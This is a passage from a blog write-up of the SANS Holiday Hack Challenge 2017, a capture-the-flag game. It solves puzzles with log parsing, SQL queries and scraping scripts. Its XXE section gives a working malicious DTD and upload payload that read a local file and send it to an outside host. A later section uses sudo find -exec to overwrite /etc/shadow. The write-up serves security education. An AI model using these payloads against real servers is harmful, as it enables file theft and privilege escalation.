Alright, now that we have only the user-agents, we can :code:`sort` the
user-agents, and use :code:`uniq` to  remove duplicates, and count the number
of unique user-agents:

.. code-block:: console
    :hl_lines: 4

    elf@7283fcc58ff6:~$ cut -d'"' -f 6 access.log  | sort | uniq -c
          2 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36
        143 -
          1 Dillo/3.0.5
          3 GarlikCrawler/1.2 (http://garlik.com/, crawler@garlik.com)
         34 Googlebot-Image/1.0
          3 MobileSafari/604.1 CFNetwork/889.9 Darwin/17.2.0
          4 Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
          8 Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)
        345 Mozilla/4.0 (compatible;)
          2 Mozilla/5.0
    [snip]

Hmm, :code:`Dillo/3.0.5` seems to be the least popular web-browser, with only
one entry. However, there may be other user-agents with only one hit in the
log file. Let's sort our counted output:

.. code-block:: console
    :hl_lines: 62

    elf@7283fcc58ff6:~$ cut -d'"' -f 6 access.log  | sort | uniq -c | sort -gr
      27285 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
       8501 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
       6221 Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
       6183 Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
       3163 Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko
       2733 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/62.0.3202.94 Chrome/62.0.3202.94 Safari/537.36
       2427 Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0
       2099 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36
       2006 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
       2002 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36
    [snip]
          2 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36
          1 slack/2.47.1.7358 (samsung SM-G955F; Android 7.0)
          1 slack/2.47.1.7358 (samsung SM-G950U; Android 7.0)
          1 slack/2.47.1.7358 (samsung SM-G935T; Android 7.0)
          1 slack/2.47.1.7358 (samsung SM-G935L; Android 7.0)
          1 slack/2.47.1.7358 (samsung SM-G930F; Android 7.0)
          1 slack/2.47.1.7358 (samsung SM-G920P; Android 7.0)
          1 slack/2.47.1.7358 (motorola XT1635-02; Android 7.1.1)
          1 slack/2.47.1.7358 (motorola Moto G (5) Plus; Android 7.0)
          1 slack/2.47.1.7358 (Xiaomi Redmi Note 4; Android 7.0)
          1 slack/2.46.0.7100 (lenovo Lenovo K8 Note; Android 7.1.1)
          1 slack/2.47.1.7358 (OnePlus ONEPLUS A3000; Android 7.1.1)
          1 slack/2.47.1.7358 (OnePlus ONE A2003; Android 8.0.0)
          1 slack/2.47.1.7358 (LYF LS-5504; Android 5.1.1)
          1 slack/2.47.1.7358 (Intex Cloud Q11 4G; Android 6.0)
          1 slack/2.47.1.7358 (Huawei Nexus 6P; Android 8.0.0)
          1 slack/2.47.1.7358 (HUAWEI AGS-W09; Android 7.0)
          1 slack/2.47.1.7358 (Google Pixel XL; Android 8.0.0)
          1 slack/2.47.0.7352 (samsung SM-N950U; Android 7.1.1)
          1 slack/2.47.0.7352 (samsung SAMSUNG-SM-N910A; Android 6.0.1)
          1 slack/2.47.0.7352 (samsung SAMSUNG-SM-G870A; Android 6.0.1)
          1 slack/2.47.0.7352 (motorola Moto G (4); Android 7.0)
          1 slack/2.47.0.7352 (Sony F8331; Android 7.1.1)
          1 slack/2.47.0.7352 (OnePlus ONEPLUS A3003; Android 7.1.1)
          1 slack/2.47.0.7352 (OnePlus A0001; Android 7.1.2)
          1 slack/2.47.0.7352 (LGE Nexus 5; Android 6.0.1)
          1 slack/2.47.0.7352 (Google Pixel; Android 8.0.0)
          1 slack/2.46.0.7100 (lenovo Lenovo K8 Note; Android 7.1.1)
          1 slack/2.46.0.7100 (Wingtech 2014818; Android 7.1.2)
          1 slack/2.46.0.7100 (OnePlus ONE E1003; Android 6.0.1)
          1 slack/2.46.0.7100 (OnePlus ONE A2003; Android 6.0.1)
          1 masscan/1.0 (https://github.com/robertdavidgraham/masscan)
          1 masscan/1.0
          1 curl/7.35.0
          1 Slack/370354 CFNetwork/893.14 Darwin/17.3.0
          1 Slack/370354 CFNetwork/893.10 Darwin/17.3.0
          1 Slack/370342 CFNetwork/808.3 Darwin/16.3.0
          1 Slack/370136 CFNetwork/811.5.4 Darwin/16.7.0
          1 Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
          1 Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0; Touch; MASEJS)
          1 Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0; MASMJS)
          1 Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
          1 Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
          1 Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36
          1 Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
          1 Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
          1 Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1
          1 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko)
          1 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
          1 Dillo/3.0.5

Well, even though some other user-agents have only one hit, they seem to be
different versions of the same browser. :code:`Dillo/3.0.5` seems to be our
winner:

.. code-block:: console
    :hl_lines: 3

    elf@7283fcc58ff6:~$ ./runtoanswer
    Starting up, please wait......
    Enter the name of the least popular browser in the web log: Dillo/3.0.5
    That is the least common browser in the web log! Congratulations!

Redirecting the snowball
........................

Now that we found the least popular browser, we get a new object: the Bumper,
which can redirect the snowball.

.. image:: /images/sans-christmas-challenge-2017/bumbles_bounce_terminal.png
    :alt: bumbles_bounce_terminal.png
    :align: center

Now here's the layout I used to redirect the snowball. Incidently, I learned
that the Jam slows the snowball down, because it's sticky:

.. image:: /images/sans-christmas-challenge-2017/bumbles_bounce_snowball.gif
    :alt: bumbles_bounce_snowball.gif
    :align: center

This level had the `fifth page to The Great Book </docs/sans-christmas-challenge-2017/GreatBookPage5.pdf>`__ (sha256: :code:`aed664454f956ed4f80c54540c4980ae28912c3ff816733a6fb84b366bd32c67`):

    The Abominable Snow Monster

    When the Elves and reindeer refugees first arrived at the North Pole, they
    found a barren but workable landscape. The desolate peace of the cold North
    was a welcomed change from the bitter battles with the Munchkins back in
    Oz. Dressed up like Eskimos for their first several months, all elves from
    one to ninety-two worked without interruption building homes for
    themselves, stalls for the reindeer, toy production lines, and finally a
    splendid castle for Santa.

    But then, it started. Some of their food stocks mysteriously disappeared.
    Initially, the Elves hypothesized that Munchkins Moles were pilfering their
    provisions, so they embarked on a detailed investigation. Sadly, the
    taskforce found very little evidence, except for MASSIVE footprints in the
    snow near the food storage bins.

    And then, it got worse. Elves started disappearing. One at a time, over the
    space of a couple of weeks, a half dozen elves simply vanished, their last
    known location surrounded by more gigantic footprints.

    The taskforce bravely followed the footprints back to an enormous cave,
    where they found a gigantic furry beast with horrible fangs. The so-called
    "Abominable Snow Monster" had enslaved the kidnapped elves, forcing them
    to make gigantic snowballs he could throw as weapons. After mounting a
    daring rescue operation, the Elves vowed to steer clear of the entire
    region inhabited by the Abominable.

    In later years, through the tireless efforts of social worker and arctic
    prospector Yukon Cornelius, a miracle occurred! The Abominable actually
    became a jolly, happy soul, who could laugh and play. The Elves welcomed
    the newly friendly beast and started calling him "Bumble" as he earned a
    job putting Christmas tree toppers into place without a stepladder.

    Very recently, though, the Bumble's behaviour has become quite erratic.
    Several times every day, his eyes seem to go blank as he stares off into
    the distance. Rumor among the elves is that there must have been some
    magic in something the Bumble ate. As of this writing, the Bumble is under
    careful analysis by Yukon Cornelius and the North Pole's best
    veterinarians. A diagnosis remains elusive.

After solving this challenge, we have a little chat with Sam the Snowman:

    **Bumble:** Arrrrrrrrgh! Grrrrrrrr! ROOOOOOOAR!

    **Sam the Snowman:** You've done it! You found out who was throwing the
    giant snowballs! It was the Abominable Snow Monster. We should have known.
    Thank you for your great work!

    But, you know, he doesn't seem quite himself. Look into his eyes. It almost
    looks like he has been hypnotized. Something's not right with him.

    In fact, he seems to be under someone else's control. We've got to find out
    who is pulling his strings, or else the real villain will remain on the
    loose and will likely strike again.

    It means, buckle your seatbelt, dear player, because the North Pole is
    going bye-bye.

North Pole Christmas Town infrastructure: North Pole Police Department web site
-------------------------------------------------------------------------------

In the fourth page, we learned the existence of Munchkin moles, that try to
pass for Elves in order to spy on them. Let's try to learn more about these
Munchkin moles!

If we take a look back at the documents we found on the SMB server, there is
one called "BOLO - Munchkin Mole Report.docx". This is the content:

    BOLO: Munchkin Mole Advisory

    Please be advised that the long-rumored munchkin moles are now believed to
    be real.  After a detailed and thorough investigation, North Pole
    Authorities have identified two munchkins impersonating elves in Santa's
    workshop.

    When confronted, both munchkins were able to evade elf authorities after
    throwing rocks and engaging in aggravated hair pulling. The pair
    mysteriously disappeared after speaking an unknown word sounding like
    "puuurzgexgull."

    Munchkin Descriptions

    **Name**: Boq Questrian

    **Height**: Approximately 4 feet

    **Weight**: Unknown

    **Appearance**: Reddish skin tone, blue eyes. A single curl of hair
    dominates an otherwise unremarkable hairstyle.

    **Warning**: Boq is uncannily accurate at short-distance rock throwing.

    **Name**: Bini Aru

    **Height**: Approximately 4 feet

    **Weight**: Unknown

    **Appearance**: Pale skin, grey eyes. Unruly black hair.

    **Warning**: Bini is unrelenting in hair pulling.

    If you see these munchkin moles, do not attempt to detain or apprehend
    them. Contact the North Pole Police Department for assistance.

    For more information visit https://nppd.northpolechristmastown.com.

    Merry Christmas!

So, two Munchkin moles were identified, Boq Questrian and Bini Aru. But there
may be more. Let's try and use the North Pole Police Department's website
to identify potential moles.

The `North Pole Police Department's website <https://nppd.northpolechristmastown.com>`__
has a section infractions, where you can find what kind of infractions were
commited by children. The infractions go from `playing ball in the house <https://nppd.northpolechristmastown.com/infractions?query=Playing+ball+in+house>`__
to `trying to ruin Christmas <https://nppd.northpolechristmastown.com/infractions?query=Trying+to+ruin+Christmas>`__.

After too many infractions, children are put on the naughty list. But how many
infractions does it take?

On the SMB server, we also had a file called "Naughty and Nice List.csv", which
gives us, line by line, the name of a child and whether their naughty or nice:

.. code-block:: console

    $ head Naughty\ and\ Nice\ List.csv
    Abdullah Lindsey,Nice
    Abigail Chavez,Nice
    Aditya Perera,Naughty
    Adrian Kemp,Nice
    Adrian Lo,Nice
    Adriana Sutherland,Nice
    Agnes Adam,Nice
    Ahmed Hernandez,Nice
    Al Molina,Nice
    Alabaster Snowball,Nice

Shame on you, Aditya Perera! Anyway, we can query the North Pole Police
Department website to query information on the children, and get results in
JSON for easy parsing. So, here's a quick Python script which queries the
NPPD website, and get the number of infractions for every child:

.. code-block:: python

    #!/usr/bin/env python3

    import sys
    import requests

    def main(naughty_nice_file):
        url = 'https://nppd.northpolechristmastown.com/infractions?query={}&json=1'
        max_infraction_nice = -1
        min_infraction_naughty = sys.maxsize

        with open(naughty_nice_file, 'r') as f:
            # We read every line...
            for line in f.readlines():
                # ...and get the name of the child
                name = line.split(',')[0]
                r = requests.get(url.format(name))
                # We retrieve the number of infraction for the child
                number_of_infractions = r.json()['count']
                # If the child is nice, we see if the number of infraction is
                # greater than the existing max
                if 'Nice' in line:
                    if number_of_infractions > max_infraction_nice:
                        max_infraction_nice = number_of_infractions
                # If the child is naughty, we see if the number of infraction is
                # smaller than the existing min
                if 'Naughty' in line:
                    if number_of_infractions < min_infraction_naughty:
                        min_infraction_naughty = number_of_infractions

        print('Maximum number of infractions for nice child: {}'.format(max_infraction_nice))
        print('Minimum number of infractions for naughty child: {}'.format(min_infraction_naughty))

    if __name__ == '__main__':
        if len(sys.argv) == 2:
            main(sys.argv[1])
        else:
            print('usage: {} <naughty_nice_file>'.format(sys.argv[0]))

Now, let's run the script:

.. code-block:: console

    $ ./number_of_infractions.py "Naughty and Nice List.csv"
    Maximum number of infractions for nice child: 3
    Minimum number of infractions for naughty child: 4

We've found that every nice child has at most three infractions, and every
naughty child has at least four infractions. So it's safe to say that it takes
four infractions to be put on the naughty list.

Technically, we could have only queried the number of infractions for naughty
children, which wouls have given us four. Then we would only had to find a
nice child with three infractions, such as `Al Molina <https://nppd.northpolechristmastown.com/infractions?query=al+molina>`__.
This supposes that :math:`max\_infraction\_nice < min\_infraction\_naughty`,
but this seems to be a valid hypothesis.

Now, according to the report, the Munchkin moles were heavily into hair-pulling
and rock-throwing. Let's query the NPPD website for children that commited both
these infractions:

.. code-block:: python

    #!/usr/bin/env python3

    import requests

    def main():
        hair_pulling_url = 'https://nppd.northpolechristmastown.com/infractions?query=Aggravated+pulling+of+hair&json=1'
        rock_throwing_url = 'https://nppd.northpolechristmastown.com/infractions?query=Throwing+rocks+%28at+people%29&json=1'

        # We use sets to avoid duplicate names
        hair_pullers = set()
        rock_throwers = set()

        # We first get hair-pullers
        r = requests.get(hair_pulling_url)
        for result in r.json()['infractions']:
            hair_pullers.add(result['name'])

        # Then we get rock throwers
        r = requests.get(rock_throwing_url)
        for result in r.json()['infractions']:
            rock_throwers.add(result['name'])

        # Finally, we get the intersection, to find children who have done both
        print('\n'.join(hair_pullers.intersection(rock_throwers)))

    if __name__ == '__main__':
        main()

.. code-block:: console

    $ ./find_moles.py
    Nina Fitzgerald
    Kirsty Evans
    Beverly Khalil
    Sheri Lewis

We now have the name of four more probable Munchkin moles, which gives us a
total of six Munchkin moles.

Sixth page of *The Great Book*
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
North Pole and Beyond: I don't think we're in Kansas anymore
------------------------------------------------------------
Cranberry Pi
............

::

                           *
                          .~'
                         O'~..
                        ~'O'~..
                       ~'O'~..~'
                      O'~..~'O'~.
                     .~'O'~..~'O'~
                    ..~'O'~..~'O'~.
                   .~'O'~..~'O'~..~'
                  O'~..~'O'~..~'O'~..
                 ~'O'~..~'O'~..~'O'~..
                ~'O'~..~'O'~..~'O'~..~'
               O'~..~'O'~..~'O'~..~'O'~.
              .~'O'~..~'O'~..~'O'~..~'O'~
             ..~'O'~..~'O'~..~'O'~..~'O'~.
            .~'O'~..~'O'~..~'O'~..~'O'~..~'
           O'~..~'O'~..~'O'~..~'O'~..~'O'~..
          ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
         ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
        O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
       .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~
      ..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
     .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
    O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
    Sugarplum Mary is in a tizzy, we hope you can assist.
    Christmas songs abound, with many likes in our midst.
    The database is populated, ready for you to address.
    Identify the song whose popularity is the best.

After finding the least popular browser, we must now find the most popular song
in the database:

.. code-block:: console

    elf@e3f1a585649d:~$ ls -lh
    total 21M
    -rw-r--r-- 1 root root  16M Nov 29 19:28 christmassongs.db
    -rwxr-xr-x 1 root root 5.0M Dec  7 15:10 runtoanswer

A database in a single flat file indicates that it's most likely a SQLite
database:

.. code-block:: console

    elf@e3f1a585649d:~$ sqlite3 ./christmassongs.db
    SQLite version 3.11.0 2016-02-15 17:29:24
    Enter ".help" for usage hints.
    sqlite> .tables
    likes  songs

We have two tables, one named :code:`likes`, one named :code:`songs`. Let's
see their structure:

.. code-block:: console
    :hl_lines: 3 4 11 13

    sqlite> .schema
    CREATE TABLE songs(
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      title TEXT,
      artist TEXT,
      year TEXT,
      notes TEXT
    );
    CREATE TABLE likes(
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      like INTEGER,
      datetime INTEGER,
      songid INTEGER,
      FOREIGN KEY(songid) REFERENCES songs(id)
    );

The :code:`songs` table is pretty straightforward. The :code:`likes` table
holds the number of likes for every song, using the song's id. If the
column :code:`like` is 1, then the song was liked.

We can query the database to get the number of likes for every song id.
The correct query was found after reading `this tutorial on the COUNT function <http://www.sqlitetutorial.net/sqlite-count-function/>`__.
This query will get the song id, their number of likes, and will sort them from
least to most liked.

.. code-block:: sql

    sqlite> SELECT songid, count(*) from likes WHERE like=1 GROUP BY songid ORDER BY count(*);
    [...]
    33|1698
    199|1702
    98|1706
    90|1715
    134|1719
    265|1720
    245|1756
    392|8996

Alright, the song with the id 392 is the most liked song. Now, we could query
the :code:`songs` manually... Or! We could use an `inner junction <http://www.sqlitetutorial.net/sqlite-inner-join/>`__,
just for the fun:

.. code-block:: sql
    :hl_lines: 3 16

    sqlite> SELECT title, count(*) from likes INNER JOIN songs on songs.id=likes.songid WHERE like=1 GROUP BY songid ORDER BY count(*);
    [...]
    I Farted on Santa's Lap (Now Christmas Is Gonna Stink for Me)|1689
    Why Couldn't It Be Christmas Every Day?|1691
    A Baby Changes Everything|1693
    I'll Be Home|1695
    Old Time Christmas|1696
    Cold December Night|1697
    Blue Holiday|1698
    Home for Christmas|1702
    Christmas Memories|1706
    Christmas Is Now Drawing Near at Hand|1715
    Coventry Carol|1719
    The Little Boy that Santa Claus Forgot|1720
    Joy to the World|1756
    Stairway to Heaven|8996

The most-liked song this Christmas seems to be `Stairway to Heaven <https://www.youtube.com/watch?v=cwFQpRTwaP0>`__.
Although `I Farted on Santa's Lap (Now Christmas Is Gonna Stink for Me) <https://www.youtube.com/watch?v=FlFjR2vUy3M>`__
seems to be doing pretty well!

.. code-block:: console

    elf@ef4955c61cfe:~$ ./runtoanswer
    Starting up, please wait......
    Enter the name of the song with the most likes: Stairway to Heaven
    That is the #1 Christmas song, congratulations!

Redirecting the snowball
........................

Having the found the most popular song for this Christmas, we're given a new
object: the Portal, which can create a duplicate of our snowball in a second
place.

.. image:: /images/sans-christmas-challenge-2017/i_dont_think_we_re_in_kansas_terminal.png
    :alt: i_dont_think_we_re_in_kansas_terminal.png
    :align: center

Here's the layout:

.. image:: /images/sans-christmas-challenge-2017/i_dont_think_we_re_in_kansas_anymore.gif
    :alt: i_dont_think_we_re_in_kansas_anymore.gif
    :align: center

North Pole Christmas Town infrastructure: Elf as a Service platform
-------------------------------------------------------------------

The Elf as a Service platform is a web application where you can order new
elves. To do so, you only have to upload an XML files, containing the details
of th elves you wish to order:

.. code-block:: http

    POST /Home/DisplayXml HTTP/1.1
    Host: eaas.northpolechristmastown.com
    Content-Length: 1946
    Origin: http://eaas.northpolechristmastown.com
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryflybX2ZBWLwspXMu

    ------WebKitFormBoundaryflybX2ZBWLwspXMu
    Content-Disposition: form-data; name="file"; filename="Elfdata.xml"
    Content-Type: text/xml

    <?xml version="1.0" encoding="utf-8"?><Elf><Elf><ElfID>1</ElfID><ElfName>Elf On a Shelf</ElfName><Contact>8675309</Contact><DateOfPurchase>11/29/2017 12:00:00 AM</DateOfPurchase><Picture>1.png</Picture><Address>On a Shelf, Obviously</Address></Elf><Elf><ElfID>2</ElfID><ElfName>Buddy the Elf</ElfName><Contact>8675309</Contact><DateOfPurchase>11/29/2017 12:00:00 AM</DateOfPurchase><Picture>2.png</Picture><Address>New York City</Address></Elf><Elf><ElfID>3</ElfID><ElfName>Legolas</ElfName><Contact>8675309</Contact><DateOfPurchase>11/29/2017 12:00:00 AM</DateOfPurchase><Picture>3.png</Picture><Address>Middle Earth</Address></Elf><Elf><ElfID>4</ElfID><ElfName>Marcus Elf</ElfName><Contact>8675309</Contact><DateOfPurchase>11/29/2017 12:00:00 AM</DateOfPurchase><Picture>4.png</Picture><Address>Canada</Address></Elf><Elf><ElfID>5</ElfID><ElfName>Alf</ElfName><Contact>8675309</Contact><DateOfPurchase>11/29/2017 12:00:00 AM</DateOfPurchase><Picture>5.png</Picture><Address>Melmac</Address></Elf><Elf><ElfID>6</ElfID><ElfName>Dobby the House Elf</ElfName><Contact>8675309</Contact><DateOfPurchase>11/29/2017 12:00:00 AM</DateOfPurchase><Picture>6.png</Picture><Address>London</Address></Elf><Elf><ElfID>7</ElfID><ElfName>Malekith</ElfName><Contact>8675309</Contact><DateOfPurchase>11/29/2017 12:00:00 AM</DateOfPurchase><Picture>7.png</Picture><Address>Asgard</Address></Elf><Elf><ElfID>8</ElfID><ElfName>Keebler Elf</ElfName><Contact>8675309</Contact><DateOfPurchase>11/29/2017 12:00:00 AM</DateOfPurchase><Picture>8.png</Picture><Address>Tree</Address></Elf><Elf><ElfID>9</ElfID><ElfName>Jangle Bells</ElfName><Contact>8675309</Contact><DateOfPurchase>11/29/2017 12:00:00 AM</DateOfPurchase><Picture>9.png</Picture><Address>North Pole</Address></Elf></Elf>

    ------WebKitFormBoundaryflybX2ZBWLwspXMu--

.. image:: /images/sans-christmas-challenge-2017/eaas_application.png
    :alt: eaas_application.png
    :align: center

Hmm, that's interesting. Uploading XML files can often lead to eXternal XML
Entities (XXE) attacks. If the XML parser on the server side does not filter
XML entities, we can make the server perform several actions, such as outputing
the content of a local file, etc. More details are given in this `SANS blog
post <https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities>`__.

Since we want to recover the content of :code:`C:\greatbook.txt`, let's
implement the attack, as given in the above tutorial. First, we'll host a
malicious .dtd file on our public facing server:

.. code-block:: xml

    <?xml version="1.0" encoding="UTF-8"?>
    <!ENTITY % stolendata SYSTEM "file:///c:/greatbook.txt">
    <!ENTITY % inception "<!ENTITY &#x25; sendit SYSTEM 'http://X.X.X.X/greatbook?%stolendata;'>">

Then, we'll send our malicious XML file to the EaaS application:

.. code-block:: html
    :hl_lines: 12 13 14 15 16

    POST /Home/DisplayXml HTTP/1.1
    Host: eaas.northpolechristmastown.com
    Content-Length: 731
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryflybX2ZBWLwspXMu

    ------WebKitFormBoundaryflybX2ZBWLwspXMu
    Content-Disposition: form-data; name="file"; filename="Elfdata.xml"
    Content-Type: text/xml

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE demo [
         <!ELEMENT demo ANY >
         <!ENTITY % extentity SYSTEM "http://X.X.X.X/evil.dtd">
         %extentity;
         %inception;
         %sendit;
          ]
    >
    <Elf>
        <Elf>
            <ElfID>1</ElfID>
            <ElfName>Elf On a Shelf</ElfName>
            <Contact>8675309</Contact>
            <DateOfPurchase>11/29/2017 12:00:00 AM</DateOfPurchase>
            <Picture>1.png</Picture>
            <Address>On a shelf, obviously</Address>
       </Elf>
    </Elf>

    ------WebKitFormBoundaryflybX2ZBWLwspXMu--

We now trigger the XML parser by visiting the :code:`/Home/DisplayXml` page,
which will trigger the downloading of our evil .dtd file:

.. code-block:: console

    $ tail -f access.log | grep -E 'greatbook|evil.dtd'
    35.185.118.225 - - [29/Dec/2017:00:22:54 +0100] "GET /evil.dtd HTTP/1.1" 200 200 "-" "-"
    35.185.118.225 - - [29/Dec/2017:00:22:54 +0100] "GET /greatbook?http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf HTTP/1.1" 404 169 "-" "-"

Our payload work! We now have the content of :code:`C:\greatbook.txt`, which
is the URL http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf.
We can now download the `sixth page of The Great Book </docs/sans-christmas-challenge-2017/greatbook6.pdf>`__
(sha256: :code:`92dff9b155da22001dc72340791bde703fbf83bc0369e95aa9baea4ed5c36a84`):

    The Dreaded Inter-Dimensional Tornadoes

    Throughout our recorded history, Oz has benefitted from quite favorable
    weather, with frequent sunny days and a moderatly warm climate. Indeed, all
    Munchkins enjoy essentially year-round springtime weather, keepking flowers
    in bloom and making spirits bright.

    However, one type of weather phenomenon interrupts the otherwise beautiful
    climate of Oz - the dreaded Inter-Dimensional Tornadoes - when the weather
    outside is frightful. While quite rare, these ferocious storms appear
    suddenly and without a warning, striking Oz every year or two. These
    calamitous cyclones vary in intensity, but even the weakest have caused
    significant damage, lifting houses off their foundations and shredding
    everything in their deadly path, especially paper products.

    Inter-Dimensional Tornadoes get their unusual name because their intense
    power has been known to rip holes into the very fabric of space and time,
    allowing a single tornado to strike multiple different places in disparate
    time eras simultaneously, interlinking each time and location touched by
    the storm into a swirling inter-dimensional space-time vortex. Although the
    specific physics of such storms remains elusive to our best scientists, one
    thing is consistently observed by researchers and historians: When an
    Inter-Dimensional Tornado strikes, it not only scatters whatever it has
    vacuumed up throughout many lands, it sometimes also drops artifacts from
    the past or even the future in its wake. Such storms have brought antique
    watches, clothing, and curious gadgetry, lifting them from distant times
    and far away places and depositing them in Oz.

Seventh page of *The Great Book*
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
North Pole and Beyond: Oh wait! Maybe we are...
-----------------------------------------------
Cranberry Pi
............

::

                  \ /
                -->*<--
                  /o\
                 /_\_\
                /_/_0_\
               /_o_\_\_\
              /_/_/_/_/o\
             /@\_\_\@\_\_\
            /_/_/O/_/_/_/_\
           /_\_\_\_\_\o\_\_\
          /_/0/_/_/_0_/_/@/_\
         /_\_\_\_\_\_\_\_\_\_\
        /_/o/_/_/@/_/_/o/_/0/_\
       jgs       [___]
    My name is Shinny Upatree, and I've made a big mistake.
    I fear it's worse than the time I served everyone bad hake.
    I've deleted an important file, which suppressed my server access.
    I can offer you a gift, if you can fix my ill-fated redress.
    Restore /etc/shadow with the contents of /etc/shadow.bak, then run "inspect_da_box" to complete this challenge.
    Hint: What commands can you run with sudo?

We need to restore the content of :code:`/etc/shadow.bak` to :code:`/etc/shadow`.

The hint is a pretty big one. If you remember `last year's Christmas Challenge </posts/2017/01/05/sans-christmas-challenge-2016/#sans-christmas-challenge-2016>`__,
you remember that we can use :code:`sudo -l` to see what kind of command we
can execute:

.. code-block:: console

    elf@760499dcc4c9:~$ sudo -l
    Matching Defaults entries for elf on 760499dcc4c9:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    User elf may run the following commands on 760499dcc4c9:
        (elf : shadow) NOPASSWD: /usr/bin/find

We can execute :code:`find` as :code:`elf:shadow` (that is, as the user
:code:`elf`, member of the group :code:`shadow`, I didn't know this syntax).
Let's take a look at the permissions to our :code:`shadow` files:

.. code-block:: console

    elf@760499dcc4c9:~$ ls -lh /etc/shadow*
    -rw-rw---- 1 root shadow 677 Dec 23 23:59 /etc/shadow
    -rw------- 1 root root   652 Nov 14 13:48 /etc/shadow-
    -rw-r--r-- 1 root root   677 Dec 15 19:59 /etc/shadow.bak

We can see that the :code:`shadow` group has write access to :code:`/etc/shadow`.
So, we need a way, by running :code:`find`, to copy the content from
:code:`/etc/shadow.bak` to :code:`/etc/shadow`. Luckily, :code:`find` has the
:code:`-exec` parameter, which can be used to execute command on the found
files:

.. code-block:: console

    elf@760499dcc4c9:~$ sudo -g shadow /usr/bin/find /etc -name shadow.bak -exec cp {} /etc/shadow \; 2> /dev/null
    elf@760499dcc4c9:~$ inspect_da_box
                         ___
                        / __'.     .-"""-.
                  .-""-| |  '.'.  / .---. \
                 / .--. \ \___\ \/ /____| |
                / /    \ `-.-;-(`_)_____.-'._
               ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
               | |      /       \ /      `\ `. \       / .-. \
               \ \     |         Y    __...\  \ \     / /   \/
         /\     | |    | .--""--.| .-'      \  '.`---' /
         \ \   / /     |`        \'   _...--.;   '---'`
          \ '-' / jgs  /_..---.._ \ .'\\_     `.
           `--'`      .'    (_)  `'/   (_)     /
                      `._       _.'|         .'
                         ```````    '-...--'`
    /etc/shadow has been successfully restored!

Redirecting the snowball
........................

No new object for this one!

.. image:: /images/sans-christmas-challenge-2017/oh_wait_maybe_we_are_terminal.png
    :alt: oh_wait_maybe_we_are_terminal.png
    :align: center

Here's the layout:

.. image:: /images/sans-christmas-challenge-2017/oh_wait_maybe_we_are_snowball.gif
    :alt: oh_wait_maybe_we_are_snowball.gif
    :align: center

North Pole Christmas Town infrastructure: Elf-Machine Interface server
----------------------------------------------------------------------

The seventh question specifies that people use the Elf-Machine Interface server
to access email, and that we could get access to it via a phishing attack.

Let's take a look at Alabaster's emails. First, the phishing scenario:

    **From:** alabaster.snowball@northpolechristmastown.com

    **To:** "jessica.claus@northpolechristmastown.com"

    **Subject:** gingerbread cookie recipe

    Hey Mrs Claus,

    Do you have that awesome gingerbread cookie recipe you made for me last
    year? You sent it in a MS word .docx file. *I would totally open that
